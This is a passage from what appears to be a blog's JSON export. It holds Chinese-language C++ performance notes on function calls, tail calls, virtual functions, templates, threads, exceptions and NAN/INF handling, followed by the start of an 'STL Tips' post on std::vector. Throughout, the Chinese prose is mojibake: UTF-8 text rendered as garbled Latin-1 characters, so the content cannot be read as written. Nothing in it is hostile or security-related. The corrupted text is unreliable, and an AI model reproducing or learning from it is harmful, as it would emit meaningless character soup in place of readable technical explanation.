å¸§å‡½æ•°ç”¨äºæè¿°å‡½æ•°è°ƒç”¨æœŸé—´çš„å †æ ˆç»“æ„ï¼ŒåŒ…å«äº†å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€å±€éƒ¨å˜é‡å’Œä¸´æ—¶æ•°æ®ç­‰ã€‚å®ƒæä¾›äº†å‡½æ•°æ‰§è¡Œçš„ç¯å¢ƒå’Œä¸Šä¸‹æ–‡åˆ‡æ¢æ‰€éœ€çš„ä¿¡æ¯ã€‚ å¸§å‡½æ•°è¿˜åŒ…æ‹¬å‡½æ•°è°ƒç”¨è¿”å›æ—¶æ‰€éœ€çš„æ¸…ç†æ“ä½œï¼Œå¦‚æ¢å¤è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡å’Œå¤„ç†è¿”å›å€¼ç­‰ã€‚ å¶å‡½æ•°ï¼ˆLeaf Functionï¼‰ï¼š å¶å‡½æ•°æ˜¯æŒ‡åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ä¸ä¼šè°ƒç”¨å…¶ä»–å‡½æ•°çš„å‡½æ•°ï¼Œå³å®ƒæ²¡æœ‰å…¶ä»–çš„å­å‡½æ•°è°ƒç”¨ã€‚å¶å‡½æ•°æ‰§è¡Œå®Œæ¯•åç›´æ¥è¿”å›ï¼Œè€Œä¸ä¼šè¿›ä¸€æ­¥è°ƒç”¨å…¶ä»–å‡½æ•°ã€‚ å¶å‡½æ•°é€šå¸¸æ¯”è¾ƒç®€å•ï¼Œä¸æ¶‰åŠå¤æ‚çš„é€’å½’æˆ–å‡½æ•°è°ƒç”¨é“¾ï¼Œå¹¶ä¸”åœ¨æ€§èƒ½ä¼˜åŒ–æ–¹é¢å…·æœ‰ä¸€å®šçš„ä¼˜åŠ¿ã€‚ ä½¿ç”¨å®ä»£æ›¿å‡½æ•° ä¸è¦æ»¥ç”¨å®ï¼Œå®çš„é—®é¢˜æ˜¯ï¼šåç§°ä¸èƒ½é‡è½½æˆ–é™åˆ¶ä½œç”¨åŒºåŸŸã€‚å®å°†å¹²æ‰°å…·æœ‰ç›¸åŒåç§°çš„ä»»ä½•å‡½æ•°æˆ–å˜é‡ï¼Œè€Œä¸ä½œç”¨åŸŸæˆ–å‘½åç©ºé—´æ— å…³ã€‚ ä½¿å‡½æ•°å±€éƒ¨åŒ– åº”è¯¥ä½¿åŒä¸€ä¸ªæ¨¡å—ä¸­ä½¿ç”¨çš„å‡½æ•°ï¼ˆå³å½“å‰ .cpp æ–‡ä»¶ï¼‰æ˜¯å±€éƒ¨çš„ã€‚ è¿™ä½¿å¾—ç¼–è¯‘å™¨æ›´å®¹æ˜“å°†å‡½æ•°å†…è”ï¼Œå¹¶å¯¹å‡½æ•°è°ƒç”¨è¿›è¡Œä¼˜åŒ–ã€‚ å¦‚ä½•ä½¿å‡½æ•°å±€éƒ¨åŒ–å‘¢ï¼Ÿ å¯¹äºéç±»æˆå‘˜å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨static å¯¹äºç±»æˆå‘˜å‡½æ•°ï¼Œå°†å‡½æ•°æˆ–ç±»æ”¾ç½®äºåŒ¿åå‘½åç©ºé—´ä¸­ ä½¿ç”¨å…¨ç¨‹åºä¼˜åŒ– ä¸€äº›ç¼–è¯‘å™¨å…·æœ‰å¯¹æ•´ä¸ªç¨‹åºè¿›è¡Œä¼˜åŒ–çš„é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å°†å¤šä¸ª .cpp æ–‡ä»¶ç»„åˆæˆä¸€ä¸ªå¯¹è±¡æ–‡ä»¶ã€‚è¿™ä½¿å¾—ç¼–è¯‘å™¨èƒ½å¤Ÿåœ¨ç»„æˆç¨‹åºçš„æ‰€æœ‰ .cpp æ¨¡å—ä¹‹é—´ä¼˜åŒ–å¯„å­˜å™¨åˆ†é…å’Œå‚æ•°ä¼ é€’ã€‚ ä½¿ç”¨64ä½æ¨¡å¼ ç°åœ¨æœåŠ¡å™¨ç«¯å¼€å‘éƒ½æ˜¯64ä½æ¨¡å¼äº†å§ï¼Ÿ å‡½æ•°å‚æ•° åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå‡½æ•°å‚æ•°æ˜¯æŒ‰å€¼ä¼ é€’çš„ã€‚è¿™æ„å‘³ç€å‚æ•°çš„å€¼è¢«å¤åˆ¶åˆ°ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ã€‚å¯¹äºintã€floatã€doubleã€boolã€enum ä»¥åŠæŒ‡é’ˆå’Œå¼•ç”¨ç­‰ç®€å•ç±»å‹ï¼Œè¿™éå¸¸å¿«ã€‚ æ•°ç»„æ€»æ˜¯ä½¿ç”¨æŒ‡é’ˆä¼ é€’ï¼Œé™¤éå®ƒä»¬è¢«æ‰“åŒ…åœ¨ç±»æˆ–è€…ç»“æ„ä½“ä¸­ã€‚ å¦‚æœå‚æ•°æ˜¯å¤åˆç±»å‹ï¼Œåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ä¼ å€¼æ›´é«˜æ•ˆï¼Œå¦åˆ™ä½¿ç”¨æŒ‡é’ˆå’Œå¼•ç”¨æ›´é«˜æ•ˆï¼š å¯¹è±¡å¾ˆå°ï¼Œå¯ä»¥è£…å…¥ä¸€ä¸ªå¯„å­˜å™¨ å¯¹è±¡æ²¡æœ‰æ‹·è´æ„é€ å‡½æ•°å’Œææ„å‡½æ•° å¯¹è±¡æ²¡æœ‰è™šæˆå‘˜ å¯¹è±¡æ²¡æœ‰ä½¿ç”¨RTTI å°†å¤åˆå¯¹è±¡ä¼ é€’ç»™å‡½æ•°çš„é¦–é€‰æ–¹æ³•æ˜¯ä½¿ç”¨ const å¼•ç”¨ã€‚å…¶æ¬¡æ˜¯ä½¿å‡½æ•°æˆä¸ºå¯¹è±¡çš„ç±»æˆå‘˜ã€‚ 64ä½ unix ç³»ç»Ÿå…è®¸å¯„å­˜å™¨ä¸­ä¼ è¾“æœ€å¤š14ä¸ªå‚æ•° (8ä¸ªfloatæˆ–doubleï¼ŒåŠ ä¸Š6ä¸ªæ•´æ•°ã€æŒ‡é’ˆæˆ–å¼•ç”¨å‚æ•°) å‡½æ•°è¿”å›ç±»å‹ å‡½æ•°çš„è¿”å›ç±»å‹æœ€å¥½æ˜¯ç®€å•ç±»å‹ã€æŒ‡é’ˆã€å¼•ç”¨æˆ– voidã€‚è¿”å›å¤åˆç±»å‹çš„å¯¹è±¡æ›´ä¸ºå¤æ‚ï¼Œè€Œä¸”å¸¸å¸¸æ•ˆç‡ä½ä¸‹ã€‚ ç®€å•æƒ…å†µä¸‹ï¼Œå¤åˆç±»å‹å¯¹è±¡ç›´æ¥ä»å¯„å­˜å™¨è¿”å›ã€‚å¦åˆ™é€šè¿‡ä¸€ä¸ªéšè—æŒ‡é’ˆå°†å®ƒä»¬å¤åˆ¶åˆ°è°ƒç”¨æ–¹æŒ‡å®šçš„ä½ç½®ã€‚ å½“ç›´æ¥è¿”å›å¤æ‚ç±»å‹å¯¹è±¡çš„å€¼æ—¶ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šè¿›è¡ŒRVO(return value optimization)ä¼˜åŒ–ï¼Œä»è€Œé¿å…å¤åˆ¶æ„é€ å’Œææ„æˆæœ¬ï¼Œä½†å¼€å‘è€…ä¸åº”ä¾èµ–è¿™ä¸€ç‚¹ã€‚ å‡½æ•°å°¾è°ƒç”¨ å°¾è°ƒç”¨æ˜¯ä¼˜åŒ–å‡½æ•°è°ƒç”¨çš„ä¸€ç§æ–¹æ³•ã€‚å¦‚æœå‡½æ•°çš„æœ€åä¸€æ¡è¯­å¥æ˜¯å¯¹å¦ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å¯ä»¥ç”¨è·³è½¬åˆ°ç¬¬äºŒä¸ªå‡½æ•°æ¥æ›¿æ¢è¯¥è°ƒç”¨ã€‚ ç¼–è¯‘å™¨ä¼˜åŒ–å°†è‡ªåŠ¨å®Œæˆæ­¤ä»»åŠ¡ã€‚ç¬¬äºŒä¸ªå‡½æ•°ä¸ä¼šè¿”å›åˆ°ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ç¬¬ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨çš„ä½ ç½®ã€‚è¿™æ ·æ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºå®ƒæ¶ˆé™¤äº†è¿”å›æ“ä½œã€‚ é€’å½’å‡½æ•° å‡½æ•°é€’å½’è°ƒç”¨å¯¹äºå¤„ç†é€’å½’æ•°æ®ç»“æ„éå¸¸æœ‰ç”¨ã€‚é€’å½’å‡½æ•°çš„ä»£ä»·æ˜¯æ‰€æœ‰å‚æ•°å’Œå±€éƒ¨å˜é‡åœ¨æ¯æ¬¡é€’å½’æ—¶éƒ½ä¼šæœ‰ä¸€ä¸ªæ–°å®ä¾‹ï¼Œè¿™ä¼šå ç”¨æ ˆç©ºé—´ã€‚ è¾ƒå®½çš„æ ‘å½¢ç»“æ„æ¯”è¾ƒæ·±çš„æ ‘å½¢ç»“æ„ï¼Œæœ‰æ›´é«˜çš„é€’å½’æ•ˆç‡ã€‚ æ— åˆ†æ”¯é€’å½’æ€»æ˜¯å¯ä»¥ç”¨å¾ªç¯ä»£æ›¿ï¼Œè¿™æ ·çš„æ•ˆç‡æ›´é«˜ 12 ç»“æ„ä½“å’Œç±» é¢å‘å¯¹è±¡çš„å¥½å¤„ï¼š å˜é‡å­˜å‚¨åœ¨ä¸€èµ·ï¼Œæ•°æ®ç¼“å­˜æ›´æœ‰æ•ˆç‡ æ— éœ€å°†ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ç±»æˆå‘˜å‡½æ•°ï¼Œé¿å…å‚æ•°ä¼ é€’çš„å¼€é”€ é¢å‘å¯¹è±¡çš„åå¤„ï¼š éé™æ€æˆå‘˜å‡½æ•°æœ‰thisæŒ‡é’ˆï¼Œæœ‰é¢å¤–å¼€é”€ è™šæˆå‘˜å‡½æ•°çš„æ•ˆç‡è¾ƒä½ å¦‚æœé¢å‘å¯¹è±¡çš„ç¼–ç¨‹é£æ ¼æœ‰åˆ©äºç¨‹åºçš„é€»è¾‘ç»“æ„å’Œæ¸…æ™°æ€§ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨è¿™ç§é£æ ¼ ç±»çš„æ•°æ®æˆå‘˜ ç±»æˆ–ç»“æ„ä½“çš„æ•°æ®æˆå‘˜æ˜¯æŒ‰åˆ›å»ºç±»æˆ–ç»“æ„å®ä¾‹æ—¶å£°æ˜å®ƒä»¬çš„é¡ºåºè¿ç»­å­˜å‚¨ã€‚å°†æ•°æ®ç»„ç»‡åˆ°ç±»æˆ–ç»“æ„ä½“ä¸­ä¸å­˜åœ¨æ€§èƒ½æŸå¤±ã€‚ å¤§å¤šæ•°ç¼–è¯‘å™¨å°†æ•°æ®æˆå‘˜å¯¹é½åˆ°å¯ä»¥è¢«ç‰¹å®šæ•°æ•´é™¤çš„åœ°å€ä»¥ä¼˜åŒ–è®¿é—®ï¼Œå‰¯ä½œç”¨æ˜¯äº§ç”Ÿå­—èŠ‚ç©ºæ´ã€‚ ç±»çš„æˆå‘˜å‡½æ•° æ¯æ¬¡å£°æ˜æˆ–åˆ›å»ºç±»çš„æ–°å¯¹è±¡æ—¶ï¼Œå®ƒéƒ½ä¼šç”Ÿæˆæ•°æ®æˆå‘˜çš„æ–°å®ä¾‹ã€‚ä½†æ˜¯æ¯ä¸ªæˆå‘˜å‡½æ•°åªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚å‡½æ•°ä»£ç ä¸ä¼šè¢«å¤åˆ¶ã€‚ é™æ€æˆå‘˜å‡½æ•°ä¸èƒ½è®¿é—®ä»»ä½•éé™æ€æ•°æ®æˆå‘˜æˆ–éé™æ€æˆå‘˜å‡½æ•°ã€‚é™æ€æˆå‘˜å‡½æ•°æ¯”éé™æ€æˆå‘˜å‡½æ•°å¿«ã€‚ è™šæˆå‘˜å‡½æ•° å¤šæ€æ€§æ˜¯é¢å‘å¯¹è±¡ç¨‹åºæ¯”éé¢å‘å¯¹è±¡ç¨‹åºæ•ˆç‡ä½çš„ä¸»è¦åŸå› ä¹‹ä¸€ã€‚ å¦‚æœå¯ä»¥é¿å…ä½¿ç”¨è™šå‡½æ•°ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥è·å¾—é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å¤§å¤šæ•°ä¼˜åŠ¿ï¼Œè€Œæ— éœ€ä»˜å‡ºæ€§èƒ½æˆæœ¬ ã€‚ å¦‚æœå‡½æ•°è°ƒç”¨è¯­å¥æ€»æ˜¯è°ƒç”¨è™šå‡½æ•°çš„ç›¸åŒç‰ˆæœ¬ï¼Œé‚£ä¹ˆè°ƒç”¨è™šæˆå‘˜å‡½æ•°æ‰€èŠ±è´¹çš„æ—¶é—´è¦æ¯”è°ƒç”¨éè™šæˆå‘˜å‡½æ•°å¤šå‡ ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚å¦‚æœç‰ˆæœ¬å‘ç”Ÿäº†å˜åŒ–ï¼Œä½ å¯èƒ½ä¼šå¾—åˆ°10â€20ä¸ªæ—¶é’Ÿå‘¨æœŸçš„é”™è¯¯é¢„æµ‹æƒ©ç½šã€‚ æœ‰æ—¶å¯ä»¥ä½¿ç”¨æ¨¡æ¿ï¼ˆç¼–è¯‘æ—¶å¤šæ€ï¼‰è€Œä¸æ˜¯è™šå‡½æ•°æ¥è·å¾—æ‰€éœ€çš„å¤šæ€æ€§æ•ˆæœã€‚ è¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼ˆRTTIï¼‰ æ•ˆç‡ä¸é«˜ã€‚å¦‚æœç¼–è¯‘å™¨æœ‰RTTI é€‰é¡¹ï¼Œé‚£ä¹ˆå…³é—­å®ƒå¹¶ä½¿ç”¨å…¶ä»–å®ç°ã€‚ ç»§æ‰¿ æ´¾ç”Ÿç±»çš„å¯¹è±¡ä¸åŒ…å«çˆ¶ç±»å’Œå­ç±»æˆå‘˜çš„ç®€å•ç±»çš„å¯¹è±¡çš„å®ç°æ–¹æ³•ç›¸åŒã€‚çˆ¶ç±»å’Œå­ç±»çš„æˆå‘˜è®¿é—®é€Ÿåº¦ç›¸åŒã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œä½ å¯ä»¥å‡è®¾ä½¿ç”¨ç»§æ‰¿å‡ ä¹æ²¡æœ‰ä»»ä½•æ€§èƒ½æŸå¤±ã€‚ é™¤äº†ï¼š çˆ¶ç±»æ•°æ®æˆå‘˜å¤§å°ä¼šæ·»åŠ åˆ°å­ç±»æˆå‘˜çš„åç§»é‡ä¸­ã€‚åç§»é‡å¤ªå¤§æ—¶ï¼Œä¼šé€ æˆæ•°æ®ç¼“å­˜æ•ˆç‡é™ä½ã€‚ çˆ¶ç±»å’Œå­ç±»ä»£ç å¯èƒ½åœ¨ä¸åŒæ¨¡å—ã€‚é€ æˆä»£ç ç¼“å­˜æ•ˆç‡é™ä½ã€‚ å¦å¤–ï¼Œå°½é‡ä¸ä½¿ç”¨å¤šé‡ç»§æ‰¿ï¼Œä»£ä¹‹ä»¥ç»„åˆã€‚ è”åˆä½“ union æ˜¯æ•°æ®æˆå‘˜å…±äº«ç›¸åŒå†…å­˜ç©ºé—´çš„ç»“æ„ã€‚union å¯ä»¥é€šè¿‡å…è®¸ä¸åŒæ—¶ä½¿ç”¨çš„ä¸¤ä¸ªæ•°æ®æˆå‘˜å…±äº«åŒä¸€å—å†…å­˜æ¥èŠ‚çœå†…å­˜ç©ºé—´ã€‚ ä½åŸŸ ä½åŸŸè™½ç„¶æœ‰åŠ©äºä½¿æ•°æ®æ›´åŠ ç´§å‡‘ï¼Œä½†æ˜¯è®¿é—®ä½åŸŸæˆå‘˜ä¸å¦‚è®¿é—®ç»“æ„çš„æˆå‘˜æ•ˆç‡é«˜ã€‚å¦‚æœåœ¨å¤§æ•°ç»„å¯ä»¥èŠ‚çœç¼“å­˜ç©ºé—´æˆ–ä½¿æ–‡ä»¶æ›´å°ï¼Œé‚£ä¹ˆé¢å¤–çš„æ—¶é—´æ˜¯åˆç†çš„ é‡è½½å‡½æ•° é‡è½½å‡½æ•°çš„ä¸åŒç‰ˆæœ¬è¢«ç®€å•åœ°è§†ä¸ºä¸åŒçš„å‡½æ•°ã€‚ä½¿ç”¨é‡è½½å‡½æ•°æ²¡æœ‰æ€§èƒ½æŸå¤±ã€‚ é‡è½½è¿ç®—ç¬¦ é‡è½½çš„è¿ç®—ç¬¦ç›¸å½“äºä¸€ä¸ªå‡½æ•°ã€‚ä½¿ç”¨é‡è½½è¿ç®—ç¬¦ä¸ä½¿ç”¨å…·æœ‰ç›¸åŒåŠŸèƒ½çš„å‡½æ•°æ•ˆç‡ä¸€æ ·ã€‚ 13 æ¨¡æ¿ æ¨¡æ¿ä¸å®çš„ç›¸ä¼¼ä¹‹å¤„åœ¨äºï¼Œæ¨¡æ¿å‚æ•°åœ¨ç¼–è¯‘ä¹‹å‰è¢«æ›¿æ¢ã€‚ æ¨¡æ¿æ˜¯é«˜æ•ˆçš„ï¼Œå› ä¸ºæ¨¡æ¿å‚æ•°æ€»æ˜¯åœ¨ç¼–è¯‘æ—¶è¢«è§£æã€‚æ¨¡æ¿ä½¿æºä»£ç æ›´åŠ å¤æ‚ï¼Œè€Œä¸æ˜¯ç¼–è¯‘åçš„ä»£ç ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä½¿ç”¨æ¨¡æ¿åœ¨æ‰§è¡Œé€Ÿåº¦æ–¹é¢æ²¡æœ‰ä»»ä½•æˆæœ¬ã€‚ ä½¿ç”¨æ¨¡æ¿å®ç°ç¼–è¯‘æ—¶å¤šæ€ æ¨¡æ¿ç±»å¯ç”¨äºå®ç°ç¼–è¯‘æ—¶å¤šæ€æ€§ï¼Œè¿™æ¯”ä½¿ç”¨è™šæ‹Ÿæˆå‘˜å‡½æ•°è·å¾—çš„è¿è¡Œæ—¶å¤šæ€æ€§æ›´åŠ é«˜æ•ˆã€‚ æ¨¡æ¿ä»£ç å¯è¯»æ€§ä¸ä½³ã€‚ 14 çº¿ç¨‹ çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢éå¸¸è€—æ—¶ï¼Œå¯é€šè¿‡è®¾ç½®æ›´é•¿çš„æ—¶é—´ç‰‡æ¥å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ã€‚å¦å¤–ï¼Œä¸ºä¸åŒä»»åŠ¡çš„ä¸åŒçº¿ç¨‹åˆ†é…ä¸åŒçš„ä¼˜å…ˆçº§æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ ä¸ºäº†å……åˆ†åˆ©ç”¨å¤šæ ¸ï¼Œå¯ä»¥å°†å·¥ä½œåˆ’åˆ†æˆå¤šä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨å•ç‹¬çš„CPU coreä¸Šæ‰§è¡Œã€‚ä½†æ˜¯å¤šçº¿ç¨‹æœ‰å››ä¸ªæˆæœ¬ï¼š å¯åŠ¨å’Œåœæ­¢çº¿ç¨‹çš„æˆæœ¬ã€‚å¦‚æœä»»åŠ¡æ‰§è¡Œæ—¶é—´å¾ˆçŸ­ï¼Œä¸è¦ä¸ºå…¶å•ç‹¬åˆ†é…çº¿ç¨‹ã€‚ çº¿ç¨‹åˆ‡æ¢æˆæœ¬ã€‚ çº¿ç¨‹é—´åŒæ­¥å’Œé€šä¿¡æˆæœ¬ã€‚ ä¸åŒçº¿ç¨‹éœ€è¦å•ç‹¬çš„å­˜å‚¨ç©ºé—´ï¼Œçº¿ç¨‹æœ‰å„è‡ªçš„å †æ ˆï¼Œå¦‚æœçº¿ç¨‹å…±äº«ç›¸åŒçš„ç¼“å­˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¼“å­˜ç«äº‰ã€‚ å¤šçº¿ç¨‹ç¨‹åºå¿…é¡»ä½¿ç”¨çº¿ç¨‹å®‰å…¨å‡½æ•°ï¼Œçº¿ç¨‹å®‰å…¨å‡½æ•°æ°¸è¿œä¸åº”è¯¥ä½¿ç”¨é™æ€å˜é‡ (é™¤éæ˜¯åªè¯»çš„é™æ€å˜é‡) ã€‚ 15 å¼‚å¸¸å’Œé”™è¯¯å¤„ç† C++ä¸­é€šè¿‡try catchæ•è·å¼‚å¸¸ã€‚å¼‚å¸¸å¤„ç†æ—¨åœ¨æ£€æµ‹å¾ˆå°‘å‘ç”Ÿçš„é”™è¯¯ï¼Œå¹¶ä»¥ä¸€ç§ä¼˜é›…çš„æ–¹å¼ä»é”™è¯¯æ¡ä»¶ä¸­æ¢å¤ã€‚ ä½†æ˜¯ï¼Œå³ä½¿ç¨‹åºè¿è¡Œæ—¶æ²¡æœ‰é”™è¯¯ï¼Œå¼‚å¸¸å¤„ç†ä»éœ€è¦é¢å¤–çš„æ—¶é—´ï¼ŒèŠ±é”€å¤šå°‘å–å†³äºç¼–è¯‘å™¨å®ç°ã€‚ å¦‚æœä½ çš„åº”ç”¨ç¨‹åºä¸éœ€è¦å¼‚å¸¸å¤„ç†ï¼Œé‚£ä¹ˆåº”è¯¥ç¦ç”¨å®ƒï¼Œä»¥ä¾¿ä½¿ä»£ç æ›´å°ã€æ›´é«˜æ•ˆã€‚ å¯ä»¥é€šè¿‡å…³é—­ç¼–è¯‘å™¨ä¸­çš„å¼‚å¸¸å¤„ç†é€‰é¡¹æ¥ç¦ç”¨æ•´ä¸ªç¨‹åºçš„å¼‚å¸¸å¤„ç†ã€‚æˆ–è€…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘å‡½æ•°åŸå‹ä¸­æ·»åŠ  throw() å£°æ˜æ¥ç¦ç”¨å•ä¸ªå‡½æ•°çš„å¼‚å¸¸å¤„ç†ã€‚ å¼‚å¸¸å’Œå‘é‡ä»£ç  å‘é‡æŒ‡ä»¤å¯¹äºå¹¶è¡Œæ‰§è¡Œå¤šä¸ªè®¡ç®—æ˜¯æœ‰ç”¨çš„ã€‚å¦‚æœä»£ç å¯ä»¥ä»å‘é‡æŒ‡ä»¤ä¸­è·ç›Šï¼Œé‚£ä¹ˆæœ€å¥½ç¦ç”¨å¼‚å¸¸æ•è·ï¼Œè½¬è€Œä¾èµ– NAN å’Œ INF çš„ä¼ é€’ã€‚ é¿å…å¼‚å¸¸å¤„ç†çš„æˆæœ¬ å½“ä¸éœ€è¦å°è¯•ä»é”™è¯¯ä¸­æ¢å¤æ—¶ï¼Œä¸éœ€è¦å¼‚å¸¸å¤„ç†ã€‚ å»ºè®®ä½¿ç”¨ç³»ç»Ÿçš„ã€ç»è¿‡æ·±æ€ç†Ÿè™‘çš„æ–¹æ³•æ¥å¤„ç†é”™è¯¯ã€‚ åŒºåˆ†å¯æ¢å¤é”™è¯¯å’Œä¸å¯æ¢å¤é”™è¯¯ã€‚ ç¡®ä¿åˆ†é…çš„èµ„æºåœ¨å‘ç”Ÿé”™è¯¯æ—¶å¾—åˆ°æ¸…ç†ï¼Œå‘ç”¨æˆ·å‘é€é€‚å½“çš„é”™è¯¯æ¶ˆæ¯ã€‚ ç¼–å†™å¼‚å¸¸å®‰å…¨ä»£ç  ä¸ºäº†ä¿è¯å¼‚å¸¸å®‰å…¨ï¼Œéœ€è¦åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶æ¸…ç†ä¸‹åˆ—èµ„æºï¼š ä½¿ç”¨newå’Œmallocåˆ†é…çš„å†…å­˜ å¥æŸ„ äº’æ–¥é‡ æ•°æ®åº“è¿æ¥ ç½‘ç»œè¿æ¥ å¾…åˆ é™¤ä¸´æ—¶æ–‡ä»¶ å¾…ä¿æŠ¤çš„ç”¨æˆ·å·¥ä½œ å…¶ä»–å·²åˆ†é…çš„èµ„æº C++ å¤„ç†æ¸…ç†å·¥ä½œçš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªææ„å‡½æ•°ã€‚C++ å¼‚å¸¸å¤„ç†ç³»ç»Ÿç¡®ä¿è°ƒç”¨æœ¬åœ°å¯¹è±¡çš„æ‰€æœ‰ææ„å‡½æ•°ã€‚ å¦‚æœç±»æœ‰ææ„å‡½æ•°æ¥å¤„ç†åˆ†é…èµ„æºçš„æ‰€æœ‰æ¸…ç†å·¥ä½œï¼Œåˆ™ç¨‹åºæ˜¯å¼‚å¸¸å®‰å…¨çš„ã€‚å¦‚æœææ„å‡½æ•°å¼•å‘å¦ä¸€ä¸ªå¼‚å¸¸ï¼Œåˆ™ç³»ç»Ÿå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚ å¦‚æœä½ ä½¿ç”¨è‡ªå·±çš„é”™è¯¯å¤„ç†ç³»ç»Ÿè€Œä¸æ˜¯ä½¿ç”¨å¼‚å¸¸å¤„ç†ï¼Œé‚£ä¹ˆä½ æ— æ³•ç¡®ä¿æ˜¯å¦è°ƒç”¨äº†æ‰€æœ‰ææ„å‡½æ•°å¹¶æ¸…ç†äº†èµ„æºã€‚ å¦‚æœé”™è¯¯å¤„ç†ç¨‹åºè°ƒç”¨ exit()ã€abort()ã€_endthread() ç­‰ï¼Œåˆ™ä¸èƒ½ä¿è¯æ‰€æœ‰ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚ NANå’ŒINFçš„ä¼ é€’ æµ®ç‚¹æº¢å‡ºå’Œé™¤ä»¥ 0 å¾—åˆ°æ— ç©·å¤§ INFã€‚ å¦‚æœä½ æŠŠæ— ç©·å¤§å’ŒæŸæ•°ç›¸åŠ æˆ–ç›¸ä¹˜ï¼Œç»“æœå°±æ˜¯æ— ç©·å¤§ INFã€‚ å¦‚æœç”¨ä¸€ä¸ªæ­£å¸¸çš„æ•°å­—é™¤ä»¥ INFï¼Œä¼šå¾—åˆ° 0ã€‚ INF â€ INF å’Œ INF / INF å¾—åˆ° NAN ï¼ˆnotâ€aâ€numberï¼‰ã€‚ å½“ä½ ç”¨ 0 é™¤ä»¥ 0 ä»¥åŠå‡½æ•°çš„è¾“å…¥è¶…å‡ºèŒƒå›´æ—¶ï¼Œæ¯”å¦‚ sqrt(â€1) å’Œ log(â€1)ï¼Œä¹Ÿä¼šå‡ºç°ç‰¹æ®Šçš„ä»£ç NANã€‚ INF å’Œ NAN çš„ä¼ æ’­ä¹Ÿä¸éœ€è¦é¢å¤–çš„æˆæœ¬ã€‚ å½“å‚æ•°ä¸º INF æˆ– NAN æ—¶ï¼Œå‡½æ•° finite() å°†è¿”å› falseï¼Œå¦‚æœå®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„æµ®ç‚¹æ•°ï¼Œåˆ™è¿”å› trueã€‚ 16 é¢„å¤„ç†å‘½ä»¤ å°±ç¨‹åºæ€§èƒ½è€Œè¨€ï¼Œé¢„å¤„ç†æŒ‡ä»¤ï¼ˆä»¥#å¼€å¤´çš„æ‰€æœ‰æŒ‡ä»¤ï¼‰çš„æ€§èƒ½æˆæœ¬å¾ˆå°‘ï¼Œå› ä¸ºå®ƒä»¬åœ¨ç¨‹åºç¼–è¯‘ä¹‹å‰å°±å·²ç»è§£æäº†ã€‚ 17 å‘½åç©ºé—´ ä½¿ç”¨åç§°ç©ºé—´ï¼Œå¯¹æ‰§è¡Œé€Ÿåº¦æ²¡æœ‰å½±å“ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"STL Tips","slug":"STL-Tips","date":"2022-06-13T14:23:13.000Z","updated":"2024-01-09T10:19:57.349Z","comments":true,"path":"posts/351032d1.html","link":"","permalink":"https://racleray.github.io/posts/351032d1.html","excerpt":"C++ STL ç¬”è®°","text":"vector vector çš„åŠŸèƒ½æ˜¯é•¿åº¦å¯å˜çš„æ•°ç»„ï¼Œä»–é‡Œé¢çš„æ•°æ®å­˜å‚¨åœ¨å †ä¸Šã€‚vector æ˜¯ä¸€ä¸ªæ¨¡æ¿ç±»ï¼Œç¬¬ä¸€ä¸ªæ¨¡æ¿å‚æ•°æ˜¯æ•°ç»„é‡Œå…ƒç´ çš„ç±»å‹ã€‚ Functions æ„é€ å‡½æ•°å’Œ size 1234567891011121314151617181920212223242526272829303132// ...// vector å¯ä»¥åœ¨æ„é€ æ—¶æŒ‡å®šåˆå§‹é•¿åº¦// vector&lt;int&gt; a(4);explicit vector(size_t n);// è¦åˆ›å»º 4 ä¸ª 233 ç»„æˆçš„æ•°ç»„å°±å¯ä»¥å†™ï¼š// vector&lt;int&gt; a(4, 233);// ç­‰ä»·äº// vector&lt;int&gt; a = &#123;233, 233, 233, 233&#125;;explicit vector(size_t n, int const &amp;val);// é€šè¿‡ a.size() è·å¾—æ•°ç»„çš„é•¿åº¦size_t size() const noexcept;// åˆ©ç”¨åˆå§‹åŒ–åˆ—è¡¨ï¼ˆC++11 æ–°ç‰¹æ€§ï¼‰åœ¨æ„é€ æ—¶å°±åˆå§‹åŒ–å…¶ä¸­å…ƒç´ çš„å€¼// vector&lt;int&gt; a = &#123;6, 1, 7, 4&#125;; // or// vector&lt;int&gt; a&#123;6, 1, 7, 4&#125;;vector(initializer_list&lt;int&gt; list);// è®¿é—® vector é‡Œçš„å…ƒç´  è¿˜å¯ä»¥å†™å…¥int &amp;operator[](size_t i) noexcept;int const 